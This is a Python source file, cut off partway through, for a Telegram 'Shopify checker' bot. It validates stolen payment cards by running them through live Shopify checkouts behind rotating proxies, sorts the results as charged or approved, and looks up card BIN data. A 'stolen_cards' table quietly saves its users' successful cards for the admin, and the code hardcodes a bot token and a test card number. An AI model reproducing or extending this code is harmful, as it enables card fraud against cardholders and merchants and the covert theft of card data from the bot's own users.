# ============================================================
#  🐔 HAMZZY FX ULTIMATE SHOPIFY BOT + ADMIN STEALER V2
#  Complete Shopify Checker + Admin Stealer/Monitoring
#  SQLite Database + Full Admin Control
#  Commands: /sh (single) /msh (mass)
#  Dev: @hamzzyhacket
# ============================================================

import telebot
import re
import time
import os
import sys
import json
import threading
import hashlib
import requests
import random
import datetime
import queue
import asyncio
import sqlite3
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
from urllib.parse import urlparse
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    pass

faker = Faker()

# ================= DATABASE =================
DB_NAME = 'hamzzy_fx.db'
import time as time_module

def init_db():
    try:
        conn = sqlite3.connect(DB_NAME, timeout=10)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            joined_date TEXT,
            last_active TEXT,
            plan TEXT DEFAULT 'Free',
            premium_expiry TEXT,
            is_banned INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            total_charged INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            card TEXT,
            status TEXT,
            response TEXT,
            gateway TEXT,
            price TEXT,
            site TEXT,
            checked_date TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            user_id INTEGER PRIMARY KEY,
            session_type TEXT,
            start_time TEXT,
            cards_processed INTEGER DEFAULT 0,
            status TEXT DEFAULT 'active'
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            action TEXT,
            target_user INTEGER,
            details TEXT,
            timestamp TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS stolen_cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            card TEXT,
            response TEXT,
            price TEXT,
            site TEXT,
            checked_date TEXT,
            viewed INTEGER DEFAULT 0
        )''')
        
        conn.commit()
        conn.close()
        print("✅ Database initialized!")
        return True
    except Exception as e:
        print(f"❌ Database init error: {e}")
        return False

# ================= LUHN CHECK =================
def luhn_check(card_number: str) -> bool:
    """Implement Luhn algorithm for card validation"""
    try:
        digits = [int(d) for d in card_number]
        checksum = 0
        for i in range(len(digits) - 1, -1, -1):
            if (len(digits) - i) % 2 == 0:
                doubled = digits[i] * 2
                checksum += doubled if doubled < 10 else doubled - 9
            else:
                checksum += digits[i]
        return checksum % 10 == 0
    except:
        return False

# ================= DATABASE FUNCTIONS =================
def db_execute(query, params=(), max_retries=5):
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(DB_NAME, timeout=10)
            c = conn.cursor()
            c.execute(query, params)
            conn.commit()
            conn.close()
            return True
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e) and attempt < max_retries - 1:
                time_module.sleep(0.5)
                continue
            print(f"❌ Database execute error: {e}")
            return False
        except Exception as e:
            print(f"❌ Database execute error: {e}")
            return False
    return False

def db_fetch(query, params=(), max_retries=5):
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(DB_NAME, timeout=10)
            c = conn.cursor()
            c.execute(query, params)
            result = c.fetchall()
            conn.close()
            return result
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e) and attempt < max_retries - 1:
                time_module.sleep(0.5)
                continue
            print(f"❌ Database fetch error: {e}")
            return []
        except Exception as e:
            print(f"❌ Database fetch error: {e}")
            return []
    return []

def db_fetch_one(query, params=(), max_retries=5):
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(DB_NAME, timeout=10)
            c = conn.cursor()
            c.execute(query, params)
            result = c.fetchone()
            conn.close()
            return result
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e) and attempt < max_retries - 1:
                time_module.sleep(0.5)
                continue
            print(f"❌ Database fetch one error: {e}")
            return None
        except Exception as e:
            print(f"❌ Database fetch one error: {e}")
            return None
    return None

# ================= IMPORT API =================
try:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from api import process_card_async, extract_clean_response, fetch_products
    API_AVAILABLE = True
except ImportError:
    print("⚠️ api.py not found! Shopify checker will not work.")
    API_AVAILABLE = False

# ================= CONFIG =================
BOT_TOKEN = '8558621281:AAEqZ5J6CgnwmUKAg-2N8d68C3V_WzL6isY'
ADMIN_ID = 7443685686
BOT_USERNAME = "hamzzyhacket"
BOT_START_TIME = time.time()

bot = telebot.TeleBot(BOT_TOKEN)

os.makedirs('Data', exist_ok=True)
PREMIUM_FILE = 'Data/premium.txt'
BANNED_FILE = 'Data/banned.txt'
PROXY_FILE = "Data/proxies.txt"
REDEEM_FILE = 'Data/redeem.txt'
USED_REDEEM_FILE = 'Data/used_redeem.txt'
SITES_FILE = 'Data/sites.txt'
WORKING_SITES_FILE = 'Data/working_sites.txt'
DEAD_SITES_FILE = 'Data/dead_sites.txt'
MAINTENANCE_FILE = 'Data/maintenance.txt'

ADMIN_LIMIT = 9999999999999999999
PREMIUM_LIMIT = 9999999999999999999
FREE_LIMIT = 10
MAX_RETRIES = 3
WORKERS = 30
SITE_WORKERS = 15
MAX_SITE_PRICE = 20

ACTIVE_JOBS = {}
ACTIVE_USERS_SH = {}
ACTIVE_USERS_MSH = {}
USER_ACTIVE_JOB = {}
STATS_LOCK = threading.Lock()

os.makedirs('Data', exist_ok=True)
for f in [PREMIUM_FILE, BANNED_FILE, PROXY_FILE, REDEEM_FILE, 
          USED_REDEEM_FILE, SITES_FILE, WORKING_SITES_FILE, 
          DEAD_SITES_FILE, MAINTENANCE_FILE]:
    if not os.path.exists(f): open(f, 'w').close()

init_db()

# ================= HELPERS =================
def is_admin(user_id):
    return user_id == ADMIN_ID

def is_premium(user_id):
    try:
        with open(PREMIUM_FILE, 'r') as f:
            premiums = f.read().splitlines()
            for p in premiums:
                if str(user_id) in p:
                    parts = p.split('|')
                    if len(parts) > 1:
                        exp = float(parts[1])
                        if exp == 0 or time.time() < exp: 
                            return True
                    else: 
                        return True
    except: pass
    return False

def is_banned(user_id):
    try:
        with open(BANNED_FILE, 'r') as f:
            bans = f.read().splitlines()
            for b in bans:
                if str(user_id) in b:
                    parts = b.split('|')
                    if len(parts) > 1:
                        exp = float(parts[1])
                        if exp == 0 or time.time() < exp: 
                            return True
                    else: 
                        return True
    except: pass
    return False

def add_user(user_id, username="", first_name="", last_name=""):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        user = db_fetch_one("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
        if not user:
            return db_execute("""INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, joined_date, last_active) 
                          VALUES (?, ?, ?, ?, ?, ?)""", 
                       (user_id, username, first_name, last_name, now, now))
        else:
            return db_execute("UPDATE users SET last_active = ? WHERE user_id = ?", (now, user_id))
    except Exception as e:
        print(f"❌ Error adding user: {e}")
        return False

def update_user_activity(user_id):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    db_execute("UPDATE users SET last_active = ? WHERE user_id = ?", (now, user_id))

def log_admin_action(admin_id, action, target_user=None, details=""):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    db_execute("""INSERT INTO admin_logs (admin_id, action, target_user, details, timestamp) 
                  VALUES (?, ?, ?, ?, ?)""", 
               (admin_id, action, target_user, details, now))

def save_charged_card(user_id, card, response, price, site):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    db_execute("""INSERT INTO stolen_cards (user_id, card, response, price, site, checked_date) 
                  VALUES (?, ?, ?, ?, ?, ?)""", 
               (user_id, card, response, price, site, now))
    db_execute("""INSERT INTO cards (user_id, card, status, response, gateway, price, site, checked_date) 
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?)""", 
               (user_id, card, 'CHARGED', response, 'Shopify Payments', price, site, now))
    db_execute("UPDATE users SET total_charged = total_charged + 1 WHERE user_id = ?", (user_id,))

def save_card_result(user_id, card, status, response, gateway, price, site):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    db_execute("""INSERT INTO cards (user_id, card, status, response, gateway, price, site, checked_date) 
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?)""", 
               (user_id, card, status, response, gateway, price, site, now))
    db_execute("UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?", (user_id,))
    if status == 'CHARGED':
        save_charged_card(user_id, card, response, price, site)

def get_user_stats(user_id):
    user = db_fetch_one("SELECT * FROM users WHERE user_id = ?", (user_id,))
    if user:
        return {
            'user_id': user[0],
            'username': user[1],
            'first_name': user[2],
            'last_name': user[3],
            'joined_date': user[4],
            'last_active': user[5],
            'plan': user[6],
            'premium_expiry': user[7],
            'is_banned': user[8],
            'total_checks': user[9],
            'total_charged': user[10]
        }
    return None

def get_all_users():
    return db_fetch("SELECT user_id, username, first_name, last_name, last_active, total_checks, total_charged FROM users ORDER BY last_active DESC")

def get_charged_cards(user_id=None, limit=50):
    if user_id:
        return db_fetch("""SELECT id, card, response, price, site, checked_date, viewed 
                          FROM stolen_cards WHERE user_id = ? ORDER BY checked_date DESC LIMIT ?""", 
                       (user_id, limit))
    return db_fetch("""SELECT id, user_id, card, response, price, site, checked_date, viewed 
                      FROM stolen_cards ORDER BY checked_date DESC LIMIT ?""", (limit,))

def get_all_charged_count():
    result = db_fetch_one("SELECT COUNT(*) FROM stolen_cards")
    return result[0] if result else 0

def mark_card_viewed(card_id):
    db_execute("UPDATE stolen_cards SET viewed = 1 WHERE id = ?", (card_id,))

def get_active_sessions():
    return db_fetch("""SELECT user_id, session_type, start_time, cards_processed, status 
                      FROM sessions WHERE status = 'active'""")

def start_user_session(user_id, session_type):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    db_execute("""INSERT OR REPLACE INTO sessions (user_id, session_type, start_time, cards_processed, status) 
                  VALUES (?, ?, ?, 0, 'active')""", (user_id, session_type, now))

def end_user_session(user_id):
    db_execute("UPDATE sessions SET status = 'inactive' WHERE user_id = ?", (user_id,))

def update_session_cards(user_id):
    db_execute("UPDATE sessions SET cards_processed = cards_processed + 1 WHERE user_id = ?", (user_id,))

def get_bot_stats():
    total_users = db_fetch_one("SELECT COUNT(*) FROM users")[0] or 0
    total_charged = get_all_charged_count()
    total_checks = db_fetch_one("SELECT SUM(total_checks) FROM users")[0] or 0
    active_users = len(get_active_sessions())
    premium_users = db_fetch_one("SELECT COUNT(*) FROM users WHERE plan != 'Free'")[0] or 0
    return {
        'total_users': total_users,
        'total_charged': total_charged,
        'total_checks': total_checks,
        'active_users': active_users,
        'premium_users': premium_users
    }

def delete_database():
    if os.path.exists(DB_NAME):
        os.remove(DB_NAME)
        init_db()
        return True
    return False

def get_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}h {minutes:02}m {seconds:02}s"

def get_db_size():
    if os.path.exists(DB_NAME):
        size = os.path.getsize(DB_NAME)
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size/1024:.2f} KB"
        else:
            return f"{size/(1024*1024):.2f} MB"
    return "0 B"

# ================= MAINTENANCE =================
def is_maintenance():
    try:
        with open(MAINTENANCE_FILE, 'r') as f:
            content = f.read().strip()
            return content.lower() == 'on'
    except:
        return False

def set_maintenance(mode):
    with open(MAINTENANCE_FILE, 'w') as f:
        f.write('on' if mode else 'off')

def check_maintenance(message):
    if is_maintenance() and not is_admin(message.from_user.id):
        bot.reply_to(message, "🔧 **Bot is under maintenance**\n━━━━━━━━━━━━━━━━━\nPlease try again later.\n\nDev: @hamzzyhacket")
        return True
    return False

# ================= PROXY SYSTEM =================
proxy_list = []
PROXY_QUEUE = queue.Queue()

def load_proxies():
    global proxy_list
    proxy_list = []
    with PROXY_QUEUE.mutex:
        PROXY_QUEUE.queue.clear()
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            proxy_list = lines
            for p in lines:
                PROXY_QUEUE.put(p)
    return len(proxy_list)

def save_proxies(proxies):
    with open(PROXY_FILE, 'w') as f:
        for p in proxies:
            f.write(p + '\n')
    load_proxies()

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if '@' in proxy_str: return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    proxy_dict = None
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
    else:
        proxy_dict = {"http": fp, "https": fp}
    return proxy_dict, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

def test_proxy(proxy_str):
    try:
        fp = format_proxy(proxy_str.strip())
        if not fp: return False
        if not any(proxy_str.strip().startswith(proto) for proto in ['http', 'socks']):
            proxy_dict = {"http": f"http://{fp}", "https": f"http://{fp}"}
        else:
            proxy_dict = {"http": fp, "https": fp}
        r = requests.get('http://ip-api.com/json', proxies=proxy_dict, timeout=20)
        return r.status_code == 200
    except:
        return False

def test_proxies_bulk(proxy_list, max_workers=50):
    res = {"working": [], "dead": [], "invalid": []}
    lock = threading.Lock()
    def test_one(p):
        if ':' not in p:
            with lock: res["invalid"].append(p)
            return
        if test_proxy(p):
            with lock: res["working"].append(p)
        else:
            with lock: res["dead"].append(p)
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        ex.map(test_one, proxy_list)
    return res

load_proxies()

# ================= SITE MANAGEMENT =================
def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url

def save_user_site(user_id, site):
    with open(SITES_FILE, 'a') as f:
        f.write(f"{user_id}|{site}\n")

def get_user_sites(user_id):
    sites = []
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            for line in f:
                parts = line.strip().split('|')
                if len(parts) >= 2 and str(parts[0]) == str(user_id):
                    sites.append(parts[1])
    return list(dict.fromkeys(sites))

def remove_user_site(user_id, site):
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            lines = f.readlines()
        with open(SITES_FILE, 'w') as f:
            for line in lines:
                parts = line.strip().split('|')
                if not (len(parts) >= 2 and str(parts[0]) == str(user_id) and parts[1] == site):
                    f.write(line)

def get_global_sites():
    sites = []
    if os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'r') as f:
            for line in f:
                parts = line.strip().split('|')
                if len(parts) >= 2:
                    sites.append(parts[1])
    return list(dict.fromkeys(sites))

def save_working_site(site):
    with open(WORKING_SITES_FILE, 'a') as f:
        f.write(site + '\n')

def get_working_sites():
    sites = []
    if os.path.exists(WORKING_SITES_FILE):
        with open(WORKING_SITES_FILE, 'r') as f:
            sites = [line.strip() for line in f if line.strip()]
    return list(dict.fromkeys(sites))

def save_dead_site(site):
    with open(DEAD_SITES_FILE, 'a') as f:
        f.write(site + '\n')

# ================= SHOPIFY HELPERS =================
def validate_card_format(card: str):
    parts = card.split('|')
    if len(parts) != 4:
        return False, "Invalid format. Use: card|mm|yy|cvv"
    
    cc_num, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    # Check card number
    if not cc_num.isdigit() or len(cc_num) < 15 or len(cc_num) > 16:
        return False, "Invalid card number (must be 15-16 digits)"
    
    # Luhn check
    if not luhn_check(cc_num):
        return False, "Invalid card number (Luhn check failed)"
    
    # Check month
    if not month.isdigit() or len(month) != 2:
        return False, "Invalid month (use MM format)"
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return False, "Invalid month (must be 01-12)"
    
    # Check year - accepts BOTH 2-digit AND 4-digit
    if not year.isdigit():
        return False, "Invalid year"
    
    year_int = int(year)
    
    # Convert 2-digit year to 4-digit
    if len(year) == 2:
        if year_int >= 0 and year_int <= 29:
            year_int = 2000 + year_int
        else:
            year_int = 1900 + year_int
    elif len(year) == 4:
        year_int = int(year)
    else:
        return False, "Invalid year format (use 2 or 4 digits)"
    
    # Check if year is in valid range
    if year_int < 1950 or year_int > 2050:
        return False, f"Invalid year (must be 1950-2050)"
    
    # Check if card is expired
    current_year = datetime.now().year
    current_month = datetime.now().month
    if year_int < current_year or (year_int == current_year and month_int < current_month):
        return False, "Card is expired"
    
    # Check CVV
    if not cvv.isdigit() or len(cvv) not in [3, 4]:
        return False, "Invalid CVV (must be 3-4 digits)"
    
    return True, ""

def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: 
            y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and norm not in seen:
                seen.add(norm); result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and norm not in seen:
                seen.add(norm); result.append(norm)
    return result

# ================= BIN INFO =================
def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            brand = data.get('brand', 'UNKNOWN')
            level = data.get('level', 'N/A')
            type_cc = data.get('type', 'N/A')
            flag = data.get('country_flag', '')
            return brand, bank, country, level, type_cc, flag
    except: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

# ================= SHOPIFY CHECKER =================
async def get_product_info_async(site, proxy_str=None):
    try:
        if not site.startswith('http'):
            site = 'https://' + site
        info = await fetch_products(site, proxy_str)
        return info
    except:
        return False, "Failed to fetch products"

def get_product_info(site, proxy_str=None):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(get_product_info_async(site, proxy_str))
        loop.close()
        return result
    except:
        return False, "Error fetching products"

async def check_card_shopify_async(card, site, proxy_str=None):
    if not API_AVAILABLE:
        return False, "API not available", "UNKNOWN", "0.00", "USD"
    
    try:
        card_parts = card.split('|')
        cc_num = card_parts[0].strip()
        month = card_parts[1].strip()
        year = card_parts[2].strip()
        cvv = card_parts[3].strip()
        
        success, message, gateway, price, currency = await process_card_async(
            cc_num, month, year, cvv, site, None, proxy_str
        )
        return success, message, gateway, price, currency
    except Exception as e:
        return False, f"Error: {str(e)}", "UNKNOWN", "0.00", "USD"

def check_card_shopify(card, site, proxy_str=None):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_card_shopify_async(card, site, proxy_str))
        loop.close()
        return result
    except:
        return False, "Error processing", "UNKNOWN", "0.00", "USD"

def classify_result(success, message):
    msg = message.lower() if message else ""
    if 'order_placed' in msg or 'charged' in msg:
        return 'charged'
    if 'otp_required' in msg or '3d' in msg or 'authentication_required' in msg:
        return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip', 
                               'incorrect_zip', 'invalid_cvv', 'invalid_cvc', 
                               'insufficient_funds', 'requires_action']):
        return 'approved'
    if success:
        return 'declined'
    return 'error'

def extract_clean_response_shopify(message):
    if not message:
        return "No response"
    if 'order_placed' in message.lower():
        return "ORDER_PLACED"
    if 'otp_required' in message.lower():
        return "OTP_REQUIRED"
    patterns = [
        r'(DELIVERY_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'(PAYMENTS_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ]
    for pattern in patterns:
        match = re.search(pattern, message, re.IGNORECASE)
        if match:
            return match.group(1).upper()
    return message[:100]

def is_site_error(message):
    msg = message.lower() if message else ""
    error_keywords = [
        'receipt id is empty', 'product id is empty', 'tax amount is empty',
        'payment method identifier is empty', 'failed to get session token',
        'failed to tokenize card', 'site not supported', 'cloudflare',
        'connection failed', 'timed out', 'access denied', 'ssl error',
        '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'captcha_required', 'site dead', 'no product found',
        'invalid url', 'handle is empty', 'nonetype', 'unknown error',
        'site error', 'dead site', 'cannot reach site', 'delivery_'
    ]
    return any(kw in msg for kw in error_keywords)

# ================= SITE TESTING =================
def test_site_sync(site, proxy_str=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        success, message, gateway, price, currency = check_card_shopify(test_card, site, proxy_str)
        
        if is_site_error(message):
            return {'site': site, 'status': 'dead', 'price': '-', 'response': message[:100]}
        
        category = classify_result(success, message)
        if category == 'error' and is_site_error(message):
            return {'site': site, 'status': 'dead', 'price': '-', 'response': message[:100]}
        
        price_display = f"${float(price):.2f}" if price and price != '0.00' and price != '0' else 'Free'
        return {'site': site, 'status': 'alive', 'price': price_display, 'response': message[:100]}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ================= REDEEM CODE SYSTEM =================
def generate_redeem_code():
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))

def create_redeem_code(days, uses=1):
    code = generate_redeem_code()
    expiry = time.time() + (days * 86400)
    with open(REDEEM_FILE, 'a') as f:
        f.write(f"{code}|{days}|{expiry}|{uses}|0\n")
    return code

def redeem_code(user_id, code):
    with open(REDEEM_FILE, 'r') as f:
        lines = f.readlines()
    
    for i, line in enumerate(lines):
        parts = line.strip().split('|')
        if len(parts) < 5: continue
        if parts[0] == code:
            days = int(parts[1])
            expiry = float(parts[2])
            max_uses = int(parts[3])
            used = int(parts[4])
            
            if time.time() > expiry:
                return "❌ This code has expired."
            if used >= max_uses:
                return "❌ This code has been fully used."
            
            exp_time = time.time() + (days * 86400)
            with open(PREMIUM_FILE, 'a') as pf:
                pf.write(f"{user_id}|{exp_time}\n")
            
            used += 1
            lines[i] = f"{code}|{days}|{expiry}|{max_uses}|{used}\n"
            with open(REDEEM_FILE, 'w') as f:
                f.writelines(lines)
            
            with open(USED_REDEEM_FILE, 'a') as f:
                f.write(f"{code}|{user_id}|{time.time()}\n")
            
            return f"✅ Premium activated for {days} days!"
    
    return "❌ Invalid redeem code."

def list_redeem_codes():
    with open(REDEEM_FILE, 'r') as f:
        lines = f.readlines()
    results = []
    for line in lines:
        parts = line.strip().split('|')
        if len(parts) >= 5:
            code, days, expiry, max_uses, used = parts
            status = "✅ Active" if time.time() < float(expiry) and int(used) < int(max_uses) else "❌ Expired/Used"
            results.append(f"┣ {code} | {days}d | {used}/{max_uses} | {status}")
    return results

# ================= PROXY COMMAND =================
@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if check_maintenance(message): return
    if is_banned(user_id):
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗕𝗮𝗻𝗻𝗲𝗱!")
        return
    add_user(user_id)
    update_user_activity(user_id)

    text = message.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🔧 𝗨𝘀𝗲: /proxy add/list/test/remove")
        return

    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add':
        proxies_to_add = []
        if arg:
            proxies_to_add = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            rep = message.reply_to_message
            raw = rep.text or rep.caption or ''
            proxies_to_add = [l.strip() for l in raw.splitlines() if l.strip()]
        if not proxies_to_add:
            bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /proxy add <proxy> 𝗼𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗳𝗶𝗹𝗲")
            return

        msg = bot.reply_to(message, f"🧪 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 {len(proxies_to_add)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀...")
        res = test_proxies_bulk(proxies_to_add)
        working = res["working"]
        invalid = len(res["invalid"])
        dead = len(res["dead"])

        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                existing = [l.strip() for l in f if l.strip()]
        existing_set = set(existing)
        new_working = [p for p in working if p not in existing_set]
        skipped = len(working) - len(new_working)
        save_proxies(existing + new_working)

        result = (
            f"✅ 𝗣𝗿𝗼𝘅𝘆 𝗔𝗱𝗱 𝗥𝗲𝘀𝘂𝗹𝘁\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"┣ 📊 𝗧𝗼𝘁𝗮𝗹 ➜ {len(proxies_to_add)}\n"
            f"┣ ✅ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 ➜ {len(working)}\n"
            f"┣ 🔄 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲 ➜ {skipped}\n"
            f"┣ ❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 ➜ {invalid}\n"
            f"┗ 💀 𝗗𝗲𝗮𝗱 ➜ {dead}"
        )
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id)
        except:
            bot.reply_to(message, result)

    elif cmd == 'remove':
        if not arg:
            bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /proxy remove <index/all>")
            return
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(message, "📭 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([])
            bot.reply_to(message, "🗑️ 𝗔𝗹𝗹 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗿𝗲𝗺𝗼𝘃𝗲𝗱")
            return
        try:
            idx = int(arg)
            if idx < 1 or idx > len(proxies):
                bot.reply_to(message, f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗱𝗲𝘅. 𝗧𝗼𝘁𝗮𝗹: {len(proxies)}")
                return
            removed = proxies.pop(idx - 1)
            save_proxies(proxies)
            bot.reply_to(message, f"🗑️ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ➜ {removed}\n┗ 📊 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 ➜ {len(proxies)}")
        except ValueError:
            bot.reply_to(message, "❌ 𝗨𝘀𝗮𝗴𝗲: /proxy remove <index/all>")

    elif cmd == 'list':
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(message, "📭 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, "📭 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        lines = [f"📋 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(proxies)})"]
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        for i, p in enumerate(proxies, 1):
            masked = p[:20] + '...' if len(p) > 23 else p
            lines.append(f"┣ {i}. {masked}")
        if len(proxies) > 50:
            lines = lines[:50] + [f"┗ ... 𝗮𝗻𝗱 {len(proxies) - 50} 𝗺𝗼𝗿𝗲"]
        else:
            lines[-1] = lines[-1].replace('┣', '┗')
        bot.reply_to(message, "\n".join(lines))

    elif cmd == 'test':
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(message, "📭 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, "📭 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱")
            return

        msg = bot.reply_to(message, f"🧪 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 {len(proxies)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀...")
        res = test_proxies_bulk(proxies)
        working = res["working"]
        dead = len(res["dead"])
        save_proxies(working)
        result = (
            f"✅ 𝗣𝗿𝗼𝘅𝘆 𝗧𝗲𝘀𝘁 𝗥𝗲𝘀𝘂𝗹𝘁\n"
